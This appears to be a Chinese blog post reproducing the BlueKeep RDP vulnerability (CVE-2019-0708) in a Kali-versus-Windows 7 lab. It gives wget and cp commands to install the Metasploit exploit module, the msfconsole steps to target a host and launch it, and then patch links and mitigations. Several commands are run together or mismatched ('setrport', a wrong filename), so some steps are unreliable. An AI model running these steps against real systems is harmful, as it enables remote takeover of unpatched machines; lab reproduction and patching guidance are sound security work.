# CVE-2019-0708 漏洞复现（EXP 利用） - 阿丘不秋 - 博客园

> 原文：[`www.cnblogs.com/gendan5/p/11493084.html`](https://www.cnblogs.com/gendan5/p/11493084.html)

2019 年 5 月 15 号 Windows 发布补丁，该补丁修复了远程桌面中存在的远程代码执行漏洞 CVE-2019-0708，该漏洞通过检查用户的身份验证，绕过认证，可直接通过 rdp 协议进行连接并发送恶意代码。一旦被利用会导致服务器入侵，可造成像 WannaCry 永恒之蓝漏洞一样大规模的感染。
2019 年 9 月 7 日凌晨，metaspolit 更新了漏洞利用程序，可远程代码执行获取系统权限。

0x01 环境

攻击机：kali（192.168.9.128）
靶机：windows7sp1（192.168.9.132）

kali 攻击机下载 metasploit 攻击脚本，kali 中执行以下命令。
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
下载完成后复制脚本到 metasploit-framework 中，可执行如下命令：
cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb
cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb
cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
cp cve_2019_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

0x02 复现过程

1.准备环境
Kali 中使用命令：msfconsole 进入 metasploit 中
进入 metasploit 中使用命令：reload_all 加载复制过去的脚本
在 metasploit 中使用命令：search0708 搜索 EXP 脚本

2.使用模块
在 metasploit 中使用命令： useexploit/windows/rdp/cve_2019_0708_bluekeep_rce 加载攻击模
再使用 show options 查看模块信息 www.gendan5.com

3.设置参数
设置关键选项 RHOSTS/RPORT/TARGET
set rhosts 192.168.9.132
setrport 3389
settarget 3
(因为我们使用的是 VMware，所以可以使用 target 3)

4.开始攻击
使用 exploit 开始攻击，成功建立连接。

0x03 修复建议
CVE-2019-0708 漏洞修复补丁以及安全建议
有些 windows2008 系统打不了补丁的一般是数据中心版本，可以设置一下服务器，计算机右键属性-远程设置-仅允许运行使用网络基本身份验证的远程桌面的计算机连接（更安全）（N），在这行点勾，然后确认即可，可以临时的防止漏洞的攻击。
如果对补丁不知道该如何修复的，可以启用阿里云的端口安全策略，禁止掉 3389 远程端口，只允许自己的 IP 通信即可。
1.Windows Server 2008 漏洞补丁系列下载地址
Windows Server 2008 32 位系统:
http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu
Windows Server 2008 x64 位系统:
http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu
Windows Server 2008 R2Itanium 系统:
http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu
Windows Server 2008 R2 x64 系统:
http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu
Windows Server 2008Itanium:
http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu
2.Windows Server 2003 漏洞补丁系列下载地址
Windows Server 2003 32 位系统:
http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe
Windows Server 2003 64 位系统:
http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe
3\. Windows XP 漏洞补丁系列下载地址
Windows XP SP3 32 位系统:
http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe
Windows XP SP2 64 位系统:
http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe
Windows XP SP3 for XPe:
http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe